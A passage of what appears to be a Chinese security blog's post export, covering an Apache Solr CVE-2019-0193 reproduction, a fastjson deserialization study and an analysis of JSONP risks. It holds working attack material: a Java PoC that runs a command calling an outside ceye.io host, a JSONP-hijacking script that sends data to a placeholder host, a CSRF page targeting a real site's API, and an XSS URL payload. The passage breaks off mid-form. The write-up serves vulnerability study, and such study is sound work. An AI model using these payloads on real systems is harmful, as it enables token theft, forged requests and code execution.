]]></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>document</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>entity</span>
        <span class="token attr-name">stream</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span>
        <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>entity1<span class="token punctuation">"</span></span>
        <span class="token attr-name">datasource</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>streamsrc1<span class="token punctuation">"</span></span>
        <span class="token attr-name">processor</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>XPathEntityProcessor<span class="token punctuation">"</span></span>
        <span class="token attr-name">rootEntity</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span>
        <span class="token attr-name">forEach</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/RDF/item<span class="token punctuation">"</span></span>
        <span class="token attr-name">transformer</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>script:poc<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>field</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>title<span class="token punctuation">"</span></span> <span class="token attr-name">xpath</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/RDF/item/title<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>entity</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>document</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dataConfig</span><span class="token punctuation">></span></span>
</code></pre>
<p><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15679482413077.jpg" alt="-w1428"></p>
<p>该方法虽然方便 但检测可能失败<br>缺点:对低版本无法检测 - 因为通过POST请求修改configoverlay.json文件中的配置会失败<br>可以先用以下数据包检测</p>
<pre><code>POST /solr/tika/config HTTP/1.1
Host: 127.0.0.1
Accept: */*
Content-type:application/json
Content-Length: 159
Connection: close

{&quot;set-property&quot;: {&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;: true}, &quot;set-property&quot;: {&quot;requestDispatcher.requestParsers.enableStreamBody&quot;: true}}

</code></pre><p>返回200 则可用该版本可行检测，500 则不行<br><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15679484163317.jpg" alt="-w1263"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.ishenping.com/ArtInfo/1196947.html" target="_blank" rel="noopener">solr源码通过idea进行本地调试</a><br><a href="https://github.com/jas502n/CVE-2019-0193" target="_blank" rel="noopener">https://github.com/jas502n/CVE-2019-0193</a><br><a href="https://github.com/Imanfeng/CVE-2019-0193" target="_blank" rel="noopener">https://github.com/Imanfeng/CVE-2019-0193</a><br><a href="https://github.com/1135/solr_exploit#%E6%A3%80%E6%B5%8B%E6%BC%8F%E6%B4%9E---exploit1" target="_blank" rel="noopener">https://github.com/1135/solr_exploit#%E6%A3%80%E6%B5%8B%E6%BC%8F%E6%B4%9E—exploit1</a></p>
]]></content>
      
        <categories>
            
            <category> web 渗透 </category>
            
            <category> 漏洞学习 </category>
            
            <category> Apache Solr CVE-2019-0193 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 漏洞学习 </tag>
            
            <tag> web 渗透 </tag>
            
            <tag> Apache Solr CVE-2019-0193 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[fastjson 反序列化（二）]]></title>
      <url>/2019/07/28/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/fastjson_2/</url>
      <content type="html"><![CDATA[<h1 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h1><p>在接触了fastjson的rce后，感觉还是得调用下fastjson ，最好能自己写一个漏洞环境出来</p>
<h2 id="fastjson-调用"><a href="#fastjson-调用" class="headerlink" title="fastjson 调用"></a>fastjson 调用</h2><p>基础调用fastjson的方法</p>
<h3 id="fastjson-常用序列化操作"><a href="#fastjson-常用序列化操作" class="headerlink" title="fastjson 常用序列化操作"></a>fastjson 常用序列化操作</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> Object <span class="token function">parse</span><span class="token punctuation">(</span>String text<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 把JSON文本parse为JSONObject或者JSONArray </span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> JSONObject <span class="token function">parseObject</span><span class="token punctuation">(</span>String text<span class="token punctuation">)</span>； <span class="token comment" spellcheck="true">// 把JSON文本parse成JSONObject    </span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span>  T <span class="token function">parseObject</span><span class="token punctuation">(</span>String text<span class="token punctuation">,</span> Class <span class="token class-name">clazz</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 把JSON文本parse为JavaBean </span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> JSONArray <span class="token function">parseArray</span><span class="token punctuation">(</span>String text<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 把JSON文本parse成JSONArray </span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span>  List <span class="token function">parseArray</span><span class="token punctuation">(</span>String text<span class="token punctuation">,</span> Class <span class="token class-name">clazz</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//把JSON文本parse成JavaBean集合 </span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String <span class="token function">toJSONString</span><span class="token punctuation">(</span>Object object<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 将JavaBean序列化为JSON文本 </span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String <span class="token function">toJSONString</span><span class="token punctuation">(</span>Object object<span class="token punctuation">,</span> <span class="token keyword">boolean</span> prettyFormat<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 将JavaBean序列化为带格式的JSON文本 </span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> Object <span class="token function">toJSON</span><span class="token punctuation">(</span>Object javaObject<span class="token punctuation">)</span><span class="token punctuation">;</span> 将JavaBean转换为JSONObject或者JSONArray。
</code></pre>
<p>如：通过toJSONString进行序列化<br>通过parseObject、parse进行反序列化</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">{</span>
        <span class="token keyword">private</span> String id <span class="token punctuation">;</span>
        <span class="token keyword">private</span> String name<span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token keyword">int</span> age <span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
User user <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"fastjson"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

String jsonString <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//这里将javabean（java 对象）转化成json字符串</span>
User user1 <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonString<span class="token punctuation">,</span>User<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//这里将json字符串转化成javabean（java 对象）</span>

<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
String jsonString2 <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span>SerializerFeature<span class="token punctuation">.</span>WriteClassName<span class="token punctuation">)</span>
User user3 <span class="token operator">=</span> <span class="token punctuation">(</span>User<span class="token punctuation">)</span>JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>jsonString2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//通过parse方法进行反序列化</span>
</code></pre>
<p><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643184131156.jpg" alt="-w679"><br><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643184541626.jpg" alt="-w966"></p>
<p>在进行反序列化的时候，这里显示autoType不支持<br>这个地方也正好是fastjson出现反序列化漏洞的地方。<br>代码位置：/repository/com/alibaba/fastjson/1.2.45/fastjson-1.2.45.jar!/com/alibaba/fastjson/parser/ParserConfig.class<br><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643187948237.jpg" alt="-w734"><br>这里抛出异常主要是自1.2.25及之后的版本，禁用了部分autotype的功能，也就是”@type”这种指定类型的功能会被限制在一定范围内使用。<br>而由于反序列化对象时，需要检查是否开启了autotype。所以如果反序列化检查时，autotype没有开启，就会报错。因此把测试的fastjson版本改成1.2.23<br><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643191763023.jpg" alt="-w492"></p>
<p>此时测试就可以通过<br><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643191936440.jpg" alt="-w738"></p>
<h4 id="fastjson-1-2-24前测试"><a href="#fastjson-1-2-24前测试" class="headerlink" title="fastjson 1.2.24前测试"></a>fastjson 1.2.24前测试</h4><p>盗图一张<br>fastjson反序列化流程<br><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643198176333.jpg" alt="-w875"></p>
<p>在该反序列化漏洞中测试，新特性SerializerFeature.WriteClassName反序列化。<br><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643268573584.jpg" alt="-w885"></p>
<h5 id="SerializerFeature-WriteClassName"><a href="#SerializerFeature-WriteClassName" class="headerlink" title="SerializerFeature.WriteClassName"></a>SerializerFeature.WriteClassName</h5><ul>
<li><p>实例化测试<br>根据<a href="http://rui0.cn/archives/950" target="_blank" rel="noopener">探秘Java反序列化漏洞四：Fastjson反序列化漏洞分析</a>里面的介绍有点改动</p>
<ul>
<li>坑一：内部类反序列化问题<br>在创建类A的内部类B时，类B必须要使用静态类<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Exp</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
</li>
</ul>
</li>
</ul>
<pre><code>-   坑二：内部类反序列化问题
</code></pre><p><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643291877645.jpg" alt="-w858"><br>此处只能使用parse<br><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643292138070.jpg" alt="-w699"></p>
<p>模拟流程如下：</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>fastmaven<span class="token punctuation">.</span>service<span class="token punctuation">;</span>
<span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>JSON<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>IOException<span class="token punctuation">;</span>
<span class="token keyword">import</span>  java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Runtime<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">App</span> 
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            Exp obj <span class="token operator">=</span> <span class="token punctuation">(</span>Exp<span class="token punctuation">)</span>JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token string">"{{\"@type\":\"com.fastmaven.service.App$Exp\",\"age\":18,\"name\":\"fastjson\"}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">catch</span><span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span><span class="token punctuation">{</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>

    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Exp</span> <span class="token punctuation">{</span>
        <span class="token keyword">public</span> String name<span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token function">Exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>
            String<span class="token punctuation">[</span><span class="token punctuation">]</span> commands <span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"ping"</span><span class="token punctuation">,</span><span class="token string">"xxx.ceye.io"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
            Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>commands<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">public</span> String <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"getName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> name<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"setName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre>
<p>代码执行如下：<br><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643294688396.jpg" alt="-w583"></p>
<p><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643292686330.jpg" alt="-w1420"></p>
<h5 id="流程跟踪"><a href="#流程跟踪" class="headerlink" title="流程跟踪"></a>流程跟踪</h5><p>这里跟参照的文章有点不一样，但最后还是JSONLexerBase.java 后进行命令执行，然后报错，但此时代码已经执行了。<br><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643298281257.jpg" alt="-w977"><br><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643298924797.jpg" alt="-w1023"><br><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643299811746.jpg" alt="-w885"><br><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643300069714.jpg" alt="-w1024"><br><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643301009451.jpg" alt="-w977"><br><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643301793013.jpg" alt="-w592"></p>
<p><img src="/2019/07/28/Web渗透/漏洞学习/fastjson_2/15643305824826.jpg" alt="-w1319"></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://xxlegend.com/2017/05/03/title-%20fastjson%20远程反序列化poc的构造和分析/" target="_blank" rel="noopener">fastjson 远程反序列化poc的构造和分析</a><br><a href="http://rui0.cn/archives/950" target="_blank" rel="noopener">探秘Java反序列化漏洞四：Fastjson反序列化漏洞分析</a></p>
]]></content>
      
        <categories>
            
            <category> web 渗透 </category>
            
            <category> 漏洞学习 </category>
            
            <category> fastjson </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 漏洞学习 </tag>
            
            <tag> web 渗透 </tag>
            
            <tag> fastjson </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[json与jsonp的学习与分析]]></title>
      <url>/2019/07/21/%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5/json/</url>
      <content type="html"><![CDATA[<p>[TOC]</p>
<h1 id="json与jsonp的学习与分析"><a href="#json与jsonp的学习与分析" class="headerlink" title="json与jsonp的学习与分析"></a>json与jsonp的学习与分析</h1><h2 id="json和jsonp的区别"><a href="#json和jsonp的区别" class="headerlink" title="json和jsonp的区别"></a>json和jsonp的区别</h2><p>避免在后续的工作中把json和jsonp搞混，这里说明下其区别</p>
<p>json是一种传输格式，这个不用多说，而jsonp简单来说就是利用script标签绕过同源策略，获得一个类似这样的数据，只支持get请求</p>
<p>json劫持这里属于csrf的范畴，通过回调函数名称，进行敏感数据获取。</p>
<pre><code>&lt;script&gt;
function test(data){
    //alert(v.name);
    var xmlhttp = new XMLHttpRequest();
    var url = &quot;http://xx.xx.xx.xx/&quot; + JSON.stringify(data);
    xmlhttp.open(&quot;GET&quot;,url,true);
    xmlhttp.send();
    }
&lt;/script&gt;
&lt;script src=&quot;http://xx.xx.xx.xx/1.php?callback=test&quot;&gt;&lt;/script&gt;
</code></pre><h2 id="jsonp-简介"><a href="#jsonp-简介" class="headerlink" title="jsonp 简介"></a>jsonp 简介</h2><p>json padding 将json数据填充进回调函数；在客户端创建一个回调函数并将回调函数名传给服务端，服务端根据定义的回调函数名的方法，将获取的json数据传入方法，完成回调。</p>
<h2 id="jsonp-风险"><a href="#jsonp-风险" class="headerlink" title="jsonp 风险"></a>jsonp 风险</h2><h3 id="jsonp劫持"><a href="#jsonp劫持" class="headerlink" title="jsonp劫持"></a>jsonp劫持</h3><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
<li>只使用csrf-token进行csrf校验</li>
</ul>
<p>获取csrf token这类跨域问题，CORS、PostMessage以及jsonp，这里我们先讨论jsonp的情况，在遇到这类时，可以先尝试检查是否存在泄漏token的jsonp。</p>
<h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><ul>
<li>测试方法，在get url中添加jsonp常用回调函数（可以根据具体的情况判断），常用函数名的变量名如下：<pre><code>callback、jsonpcallback、func
</code></pre>通过jsonp获取到后端身份校验token，构造CSRF页面 嵌入获取到的token值，进行后段绕过校验CSRF攻击。<br>利用示例：<pre><code>&lt;html&gt;
&lt;head&gt;
&lt;title&gt;test&lt;/title&gt;
&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;form action=&quot;http://guba.sina.com.cn/api/?s=Thread&amp;a=safe_post&quot; method=&quot;POST&quot; id=&quot;csrfsend&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;bid&quot; value=&quot;9947&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;tid&quot; value=&quot;&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;content&quot; value=&quot;这是测试结果&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;title&quot; value=&quot;这是测试标题&quot;&gt;
&lt;input type=&quot;hidden&quot; id=&quot;token&quot; name=&quot;_csrf_token&quot; value=&quot;&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;anonymous&quot; value=&quot;1&quot;&gt;
&lt;/form&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
function hehehe(obj){
  console.log(obj);
  var csrf_token = obj[&quot;result&quot;][&quot;data&quot;][&quot;_csrf_token&quot;];
  document.getElementById(&quot;token&quot;).value = csrf_token;
  document.getElementById(&quot;csrfsend&quot;).submit();
}
&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;http://guba.sina.com.cn/api/?s=Thread&amp;a=safe_post&amp;callback=hehehe&amp;bid=9947&quot;&gt;&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><h4 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h4></li>
<li>referer限制（注意referer过滤是否正则可绕过如<a href="http://www.qq.com.attack.com/attack.htm或http://www.attack.com/attack.htm?qq.com、空referer）" target="_blank" rel="noopener">http://www.qq.com.attack.com/attack.htm或http://www.attack.com/attack.htm?qq.com、空referer）</a></li>
<li>随机token</li>
</ul>
<h3 id="callback可自定义导致的安全问题-典型案例"><a href="#callback可自定义导致的安全问题-典型案例" class="headerlink" title="callback可自定义导致的安全问题 典型案例"></a>callback可自定义导致的安全问题 典型案例</h3><h4 id="Content-Type与XSS漏洞"><a href="#Content-Type与XSS漏洞" class="headerlink" title="Content-Type与XSS漏洞"></a>Content-Type与XSS漏洞</h4><h5 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>输出json时，没有严格定义Content-Type（Content-Type: application/json）</li>
<li>callback 输出点没有进行过滤处理</li>
</ul>
<h5 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h5><h5 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h5><ul>
<li>严格定义Content-Type: application/json</li>
</ul>
<ol>
<li>Content-Type校验不严漏洞</li>
</ol>
<p>在python Bottle中出现过这个问题，对应的cve编号CVE-2014-3137，在该漏洞中Bottle框架会接受诸如“text / plain; application / json”作为json内容 application/json<br>类型，攻击者可能会使用它来绕过安全机制，例如，Chrome不允许将内容类型设置为“application / json”的跨源xmlhttprequests，但在bottel中可以将其设置为“text / plain; application / json”绕过。</p>
<p>绕过形式 Content-Type防御解析HTML的事件，例如在IE6、7等版本请求的URL文件后加一个/x.html就可以解析</p>
<pre><code>http://127.0.0.1/getUsers.php/x.html?callback=＜script＞alert(/xss/)＜/script＞
</code></pre><ul>
<li>过滤callback以及JSON数据输出<br>注意 旧版ie中的utf7-BOM导致的问题</li>
</ul>
<h3 id="MHTML与JSONP"><a href="#MHTML与JSONP" class="headerlink" title="MHTML与JSONP"></a>MHTML与JSONP</h3><p>MHTML（MIME HTML协议）协议解析跨域漏洞，这个有点老，先不管</p>
<h3 id="FLASH与JSONP"><a href="#FLASH与JSONP" class="headerlink" title="FLASH与JSONP"></a>FLASH与JSONP</h3><p>这个也是早年的漏洞问题了，这里要稍微注意下content-type与jsonp的关系，执行jsonp的状态下</p>
<pre><code>Content-Type = &#39;application/json;charset=UTF-8&#39; 
Content-Type = &#39;text/json;charset=UTF-8&#39; 
Content-Type = &#39;text/javascript;charset=UTF-8&#39; 
Content-Type =&#39;application/javascript;charset=UTF-8&#39;
</code></pre><p>严格来说json格式也属于js对象的子集，严格的JavaScript对象表示法来表示结构化的数据，所以使用content-type为javascript时，服务端也认可客户端提交的json格式数据。</p>
<h5 id="FLASH的调用及域"><a href="#FLASH的调用及域" class="headerlink" title="FLASH的调用及域"></a>FLASH的调用及域</h5><ul>
<li>html调用flash，flash可以改后缀名(swf改成gif等)。</li>
<li>flash可以单独访问，但是其效果类似与html调用同域的flash，但只这个后缀必须是swf。</li>
<li>flash发动请求时，是根据flash的域来判断的，而不是html来判断：</li>
</ul>
<ol>
<li>flash请求同域资源时，直接忽视crossdomain.xml。</li>
<li>flash（跨域传输数据）请求外域资源时，受外域下crossdomain.xml里的策略限制。</li>
</ol>
<p>在CSRF的防御策略上，一般是通过referer以及token校验，但在借用flash上传的时候，可以绕过CSRF的referer和token限制。在只有referer校验的CSRF，就可以直接用 上传flash利用，在有token校验的时候，就要劫持token，在用到jsonp，就可以用jsonp劫持token，进一步利用</p>
<h5 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h5><p>利用思路如下：</p>
<ol>
<li>将flash文件上传到存在上传处的目标网站中</li>
<li>用户触发该flash中的csrf代码，由于flash请求同源资源时，直接忽视crossdomain.xml,flash发送的请求的Referer是flash的因此referer校验无效，在存在jsonp劫持的条件下，可以获取用户token，这个时候token校验值也无效了。通过flash上传+jsonp劫持绕过referer校验和token校验达到CSRF。</li>
</ol>
<h5 id="利用验证"><a href="#利用验证" class="headerlink" title="利用验证"></a>利用验证</h5><p>在利用这个jsonp之前，先来了解一下swf-json-csrf</p>
<h6 id="利用环境"><a href="#利用环境" class="headerlink" title="利用环境"></a>利用环境</h6><ul>
<li>支持旧版本flash浏览器<br>GET以及POST请求可用：</li>
</ul>
<p>chrome 61.0及以前</p>
<p>firefox 52.0.1及以前</p>
<p>Opera 47.0及以前</p>
<p>Safari 11.0及以前</p>
<ul>
<li>开启referer验证+token验证</li>
</ul>
<h3 id="利用JSONP进行水坑攻击"><a href="#利用JSONP进行水坑攻击" class="headerlink" title="利用JSONP进行水坑攻击"></a>利用JSONP进行水坑攻击</h3><p>这个是乌云里面一篇较早的文章了，水坑攻击者在有漏洞的网站上部署上可触发获取别的网站有用信息的js，如：攻击者在A网站上插入了可执行的js，建立水坑；js利用callback获取第三方网站B上的对应用户信息；将获取的信息解析发送给攻击者自己的接收平台。</p>
<h2 id="JSON风险"><a href="#JSON风险" class="headerlink" title="JSON风险"></a>JSON风险</h2><p>目标是 利用FLASH利用JSON跨站点请求伪造</p>
<h3 id="JSON格式的CSRF"><a href="#JSON格式的CSRF" class="headerlink" title="JSON格式的CSRF"></a>JSON格式的CSRF</h3><p>当数据内容提交为json格式的报文时，CSRF和常规的CSRF就不一样了，即便这个CSRF没有校验referer和token，这个时候post的数据用form形式提交，将json内容放在name属性中，这个时候会有一个value值，当这个value值为空的时候，数值会有一个”=”，正常情况下服务端json解析器在校验的时候可能会拒绝这个请求（不符合格式）。</p>
<p>随意在burp里面翻了个包来测试 效果如下：</p>
<pre><code>POST /get_flags_async HTTP/1.1
Host: experiment.appadhoc.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Referer: https://blog.csdn.net/
Content-Type: application/json;charset=UTF-8
Content-Length: 551
Origin: https://blog.csdn.net
Connection: close

{&quot;app_key&quot;:&quot;*****&quot;,&quot;client_id&quot;:&quot;*****&quot;,&quot;summary&quot;:{&quot;sdk_api_version&quot;:&quot;2.0&quot;,&quot;sdk_version&quot;:&quot;4.24.0&quot;,&quot;OS&quot;:&quot;Mac OS&quot;,&quot;os_version&quot;:&quot;10.13&quot;,&quot;os_version_name&quot;:&quot;10.13&quot;,&quot;device_model&quot;:&quot;MacIntel&quot;,&quot;country&quot;:&quot;CN&quot;,&quot;language&quot;:&quot;zh&quot;,&quot;locale&quot;:&quot;zh_CN&quot;,&quot;display_height&quot;:728,&quot;display_width&quot;:1440,&quot;device_type&quot;:&quot;Mac&quot;,&quot;device_vendor&quot;:&quot;&quot;,&quot;url&quot;:&quot;*****&quot;,&quot;referrer&quot;:&quot;&quot;,&quot;browser&quot;:&quot;Firefox&quot;,&quot;browser_version&quot;:&quot;56.0&quot;,&quot;browser_version_name&quot;:&quot;56.0&quot;,&quot;browser_engine&quot;:&quot;Gecko&quot;,&quot;source&quot;:&quot;&quot;},&quot;custom&quot;:{}}
</code></pre><p>借用burp生成的csrf的POC，将json内容置为name，value置为空</p>
<pre><code>&lt;html&gt;
  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
  &lt;body&gt;
  &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;/&#39;)&lt;/script&gt;
    &lt;form action=&quot;https://experiment.appadhoc.com/get_flags_async&quot; method=&quot;POST&quot; enctype=&quot;text/plain&quot;&gt;
